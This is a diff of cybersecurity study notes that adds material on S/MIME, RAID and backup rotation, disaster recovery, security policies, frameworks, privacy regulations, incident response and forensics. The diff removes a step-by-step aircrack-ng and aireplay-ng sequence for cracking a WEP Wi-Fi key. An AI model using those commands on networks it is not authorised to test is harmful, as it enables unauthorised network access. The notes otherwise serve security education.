@@ -441,6 +441,10 @@ or SSL encrypted connection if both the sending and receiving email servers supp
 It is more flexible than SMTPS and is slowly replacing it.  
 If a secure connection is established, it uses port **587**.
 
+**S/MIME** is the Secure Multipurpose Internet Mail Extensions standard providing cryptographic security for electronic messages.  
+S/MIME can encrypt emails and their content... but also potential malwares they contain, making it harder to detect them.
+
+
 ### Email tools
 
 **Email Tracker** is a Chrome plugin to know if the recipient has opened our email.  
@@ -483,7 +487,7 @@ HEAD / HTTP/1.0
 ```
 
 The **nmap** program can be used for network scanning, ports discovery and banner grabbing (see the Tools page).   
-It is a command-line tool, and it offers the **Zenmap** GUI in KaliLinux.
+It is a command-line tool, and it offers the **Zenmap** GUI in Kali Linux.
 
 
 ## Vulnerability Scanning
@@ -897,26 +901,6 @@ It was approved in 1999, very vulnerable and abandoned in 2004 due to its securi
 Its main weakness is its 24-bit **IV** (Initialization Vector) sent in clear text.
 
 WEP can be cracked in a few minutes by IV attack using **aircrack-ng** or other wireless crackers.  
-For example on KaliLinux :
-```commandline
-// list wireless networks and their encryption, find one using WEP
-// Note down its channel and BSSID
-airodump-ng wlan0mon
-
-// Start scanning the target wireless network
-airodump-ng --channel <CHANNEL> --bssid <BSSID> --write MyHackedTraffic wlan0mon
-
-// Keep above command running and in another terminal send an auth request
-aireplay-ng --fakeauth 0 -a <BSSID> -h <wlan0mon MAC ADDRESS> wlan0mon
-
-// Get some ARP messages
-aireplay-ng --arpreplay -b <BSSID> -h <wlan0mon MAC ADDRESS> wlan0mon 
-
-// Crack the network using the IVs from the captured traffic
-// It will try to infer the WEP key from all captured IVs
-// It may fail if not enough data, it reruns every 5000 data captured by the scan 
-aircrack-ng MyHackedTraffic.cap
-```
 
 #### WPA (Wifi Protected Access) 
 
@@ -1259,4 +1243,237 @@ SOAR are a type of security tools that facilitate incident response, threat hunt
 automated runbooks.
 
 SOAR is a next-gen form of SIEM, it can scan security data, analyze it with ML, enrich it and provision resource in response.  
-For example it can teardown a VM suspected to contain a malware and create a new VM instead.
+For example, it can teardown a VM suspected to contain a malware and create a new VM instead.
+
+
+## Redundancy and Disaster Prevention
+
+### RAID
+
+RAID is a technology to ensure data redundancy by using multiple disks.
+
+- **RAID 0** : data striping over multiple disks to increase performance, no data duplication  
+- **RAID 1** : provide redundancy by mirroring the data identically on 2 hard disks
+- **RAID 5** : it requires 3 or more physical disk drives, and provides redundancy by striping data and parity across the disk drives
+- **RAID 6** : Modified form of a RAID 5 with double parity, allows losing up to 2 of the disks
+- **RAID 10** : combine advantages of RAID 0 and RAID 1, creating a striped RAID of 2 mirrored RAID
+
+### Data Backup
+
+Data backup is performed using tapes to save the disk content regularly to be able to restore the machine state.  
+There are multiple tape rotation strategies to decide how long a tape is kept and when can it be overwritten.
+
+- **10 tapes rotation** : simple backup method using 10 tapes (one for each business day for 2 weeks).  
+  A tape is used every day and kept 2 weeks, then overwritten for the next 2 weeks cycle.  
+  This method always keeps the last 2 weeks of history.
+
+
+- **grandfather-father-son** : we use 3 sets of backup tapes called the son (daily), the father (weekly) and the grandfather (monthly) that all rotate separately.  
+  At the end of each day, we backup a new son.  
+  At the end of the week, a new father is created with the same value as the son.  
+  At the end of the month, a new grandfather is created with the same value as the son.  
+  The monthly tapes are usually kept off-site in case the site is destroyed.  
+
+
+- **Towers of Hanoi** : also 3 sets of backup tapes but rotated with a bit more complex system.  
+  A new tape is created in the first set every 2 days.  
+  A new tape is created in the second set every 4 days.  
+  A new tape is created in the third set every 8 days.  
+
+
+### DRP (Disaster Recovery Plan)
+
+A DRP is a set of written policies and procedures specifying actions to take in case of a disaster.  
+- In case of a fire destroying a part of the building, how to continue operations ?
+- In case of flood, what company to call ?
+- Procedures to switch to hot/warm/cold sites ?
+
+The DRP should contain contact information, impact determination, recovery plan (order and actions...).
+
+The **BCP** (Business Continuity Plan) is also part of the DRP.  
+It focuses on how to ensure operation are maintained in case of incident or disaster.
+
+**Disaster Recovery exercices** should be scheduled, ideally once a year, to ensure staff knows how to act in case of disaster.
+
+
+### BIA (Business Impact Analysis)
+
+BIA is a systematic activity that identifies organizational risks and determines their effect on ongoing operations.
+
+BIA uses metrics expressing the system availability :
+- **MTD** (Maximum Tolerable Downtime) : longest period of time the organization can be inoperable without going out of business
+- **RTO** (Recovery Time Objective) : time required after failure to resume normal business operations (for example power back up after blackout)
+- **WRT** (Work Recovery Time) : time in addition to RTO of individual systems to reboot following a failure (for example restart web servers after power is back)
+- **RPO** (Recovery Point Objective) : longest period of time that the organization can tolerate lost data to be unrecoverable
+- **MTTR** (Mean Time To Repair) : average time it takes to repair a network device when it breaks
+- **MTBF** (Mean Time Between Failure) : average time between failures of a device
+
+
+## Policies and Procedures
+
+**Policies** define the role of security in an organization and establish the desired end state of the security program.  
+**Organizational policies** provide general direction and goals, a framework to meet the business goals, the roles and responsibilities...  
+**System-specific policies** address the security of a specific technology, application, network or device.  
+**Issue-specific policies** address a specific security issue, like email privacy, employee termination procedures...  
+
+**Standards** implement a policy in an organization, describing mandatory actions, steps and rules to achieve.
+
+**Guidelines** are recommended actions and are flexible in nature.  
+They can accept exceptions when there is a valid reason for it (for example storage space per user...).
+
+**Procedures** are detailed step-by-step instructions to ensure personnel can perform a given action.
+
+### Data Management
+
+Data should be assigned a level of sensitivity that drives how much effort must be deployed to protect it.  
+
+**Commercial classification** levels are : 
+- Public : available online, for free or for a fee
+- Sensitive : should not yet be public (strategies, future products...) 
+- Private : data that should never go out of the organization, like employee data
+- Confidential : intellectual property, source code, business critical data...
+
+**Government classification** levels are :
+- Unclassified
+- Sensitive Unclassified
+- Confidential
+- Secret
+- Top Secret
+
+Data lifecycle should be specified in the organization policies : how long data is kept, how it is protected, how it is destroyed...  
+Some regulations require the storage of some types of data for a given period of time .
+
+**PII** (Personally Identifiable Information) are data that can identify specific people.  
+They can be employee of customer data (full name, driver license number, social security numbers, DoB, email...).
+
+Multiple regulations defining what are PII and how the must be manipulated :
+- **Privacy Act of 1974** : affect US government computer systems collecting, storing using and sharing PII  
+- **HIPAA** (Health Insurance Portability and Accountability Act) : affect healthcare providers, insurance companies, medical data clearing houses...  
+- **SOX** (Sarbanes-Oxley) : affect publicly traded US corporations and require some accounting methods and financial reporting requirements
+- **GLBA** (Gramm-Leach-Bliley Act) : affect banks, mortgage companies, loan offices, credit card providers...
+- **FISMA** (Federal Information Security Management Act) : require federal agencies to develop, document and implement an information security program to protect their data
+- **PCI-DSS** (Payment Card Industry - Data Security Standard) : contractual obligation for organization manipulating client credit card numbers
+- **HAVA** (Help America Vote Act) : regulation governing the security, confidentiality and integrity of PII during the election and voting process
+- **SB 1386** : only apply to organization making business in California, require any business storing PII to disclose any breach
+- **GDPR** (General Data Protection Regulation) : European regulation stating that personal data cannot be collected, processed or retained without the individual's informed consent.  
+  GDPR grants users the right to be forgotten : their data can be erased from the system on request.  
+  GDPR requires PII data breach notification within 72 hours.
+
+### Security Policies
+
+- **Acceptable Use Policy** : define the rules restricting how a computer, network or system may be used.
+- **Change Management Policy** : define the way of changing the state of a system, network or IT procedure (for ex the installation of a new software)
+- **Onboarding and Offboarding Policy** : define actions to take when an employee is hired, fired or quits
+
+**Due Diligence** : ensuring that IT infrastructure risks are known and managed properly  
+**Due Care** : mitigation actions taken to defend against risks discovered during due diligence  
+**Due Process** : legal term referring to how an organization (or government) must respect personnel's right 
+
+### Vendor Relationship
+
+- **NDA** (Non Disclosure Agreement) : legally binding agreement defining what data is considered confidential and should not be shared outside the relationship
+- **MOU** (Memorandum of Understanding) : non-binding agreement defining an intended common line of action
+- **SLA** (Service level agreement) : agreement defining the ability to support and respond to problems within an agreed timeframe
+- **ISA** (Interconnection Security Agreement) : define technical requirements each organization must meet when connecting 2 networks
+- **BPA** (Business Partnership Agreement) : define the conditions of a business relationship
+
+### Frameworks
+
+Some enterprise IT security architecture frameworks exist to help with the creation of policies, standards, guidelines and procedures.
+
+- **SABSA** (Sherwood Applied Business Security Architecture) : risk-driven architecture considering the how/where/who/when/why the problem.
+- **COBIT** (Control Objectives for Information and Related Technology) : security control dividing IT into 4 domains :
+  - Plan and Organize
+  - Acquire and Implement
+  - Deliver and Support
+  - Monitor and Evaluate
+- **NIST SP 800-53** : security control framework developed by the Dept of Commerce
+- **ITIL** (IT Infrastructure Library) : de-facto standard for IT service management
+
+- **CIS** (Center for Internet Security) : secure configuration guidelines for hardening, and sets of cyber-security best practices.
+- **RMF** (Risk Management Framework) : process developed for the federal government, integrating security and risk management in the system development life cycle.
+- **CSF** (Cyber Security Framework) : set of industry standards and best practices created by NIST to help manage cybersecurity risks.  
+  CSF defines 5 categories of functions : Identify / Protect / Detect / Respond / Recover
+- **ISO 27001** : international standard detailing the requirement to establish, implement and maintain an ISMS (information security management system)
+- **ISO 27002** : international standard detailing some best practice recommendations for people implementing an ISMS
+- **ISO 27701** : international standard extending ISO 27001 to enhance the existing ISMS with additional privacy requirements
+- **ISO 31000** : international standard for enterprise risk management to replace all existing standard / methodologies / paradigms across industries
+- **SOC** (System and Organization Control) : suite of reports of internal controls over an information system produced during an audit (completing another framework with an audit method)
+- **Cloud Security Alliance's Cloud Control Matrix** : framework providing fondamental security principles to guide cloud vendors
+- **Cloud Security Alliance's Reference Architecture** : methodology enabling security architects to assess their cloud IT solution security
+
+
+## Incident Response and Forensics
+
+**Incident Response** : set of procedures that an investigator follows when examining a computer security incident.
+
+**Incident management program** : program consisting of the monitoring and detection of security events on a computer
+network and the execution of proper responses.  
+Each company has its own way to conduct it, but it usually follows the same steps :
+- **Preparation** : ensure we have a well-planned incident response procedure and a strong security posture
+- **Identification** : recognize whether an event should be classified as incident
+- **Containment** : isolate the incident (close ports, terminate network connection...)
+- **Eradication** : remove the threat or attack
+- **Recovery** : restore data and re-enable servers and networks taken off during the incident
+- **Lessons Learned** : document the incident response and decide on how to improve the security posture
+
+### CSIRT (Computer Security Incident Response Team)
+
+The CSIRT needs to be available 24/7 in case an incident occurs, so a proper rotation must be in place.  
+It also needs a secure method of communication for managing incidents, ideally an out-of-band communication system.  
+
+The main members of the CSIRT are :
+- **Incident Response Manager** : oversee and prioritize actions during detection, analysis and containment of an incident, and report to executives
+- **Security Analysts** : technical analysts monitoring the network and investigating what happened on the network up to this point
+  - **Triage analysts** work on the network during the incident response to monitor the traffic and configure intrusion detection
+  - **Forensic analysts** do the detective works to understand what has occurred on the network and build a timeline of events
+- **Threat Researcher** : complement the analysts by providing threat intelligence and overall context
+- **Cross-functional support** : people from management, HR. attorney/lawyer, PR, technical experts on specific system... depending on the nature of the incident 
+
+Policies and Procedures must be in place to decide when an event is considered an incident requiring to contact the CSIRT (even at 3am).  
+Depending on the nature of the incident, policies should define appropriate resolution and communication.  
+For example, small events can be addressed directly while bigger should be reported to the management (or even the law enforcement).
+
+### Investigative data
+
+There are multiple sources of data that can be used to conduct the incident response :
+- SIEM : combine multiple data sources in a single tool, correlate them, detect trends and send alerts
+- log files (network, system, application, security, web, DNS ...)
+- Syslog / R-Syslog / Syslog-NG
+- nxlog : cross-platform open-source tool similar to syslog-ng
+- journalctl : Linux command-line utility to query and display logs from journald, the systemd logging service
+- netflow : Cisco-proprietary network protocol collecting network traffic
+- sflow : open-source version of netflow
+
+### Forensic procedures
+
+Forensic procedures are always written, to ensure they are effective and compliant with regulations.
+
+#### Identification
+
+In the Identification step, we ensure the scene is safe, and evidences are secured from contamination.  
+We also identify the scope of evidences to collect.
+
+#### Collection
+
+Ensure we have necessary authorizations to collect the evidence (warrant).  
+Collect, document and prove integrity of the collected evidence.  
+A forensic disk is usually created to serve as evidence, and allow the main server to be modified to resume operations.  
+
+Data collection must take into account the **order of volatility** :
+- L1/L2/L3/GPU caches and CPU register
+- RAM, ARP tables, cache
+- HDD, SDD
+- remote logging
+
+#### Analysis
+
+Create a copy of the evidence (bit-by-bit hard disk copy) for analysis.  
+Use repeatable methods and tools during analysis.
+
+#### Reporting
+
+Create a report documenting the methods and tools used during the investigation.  
+Present detailed findings and conclusions based on the analysis.
+
+Many forensic tools can generate a timeline, showing in a graphical format what file was edited at what time, like **EnCase** or **Autopsy**.
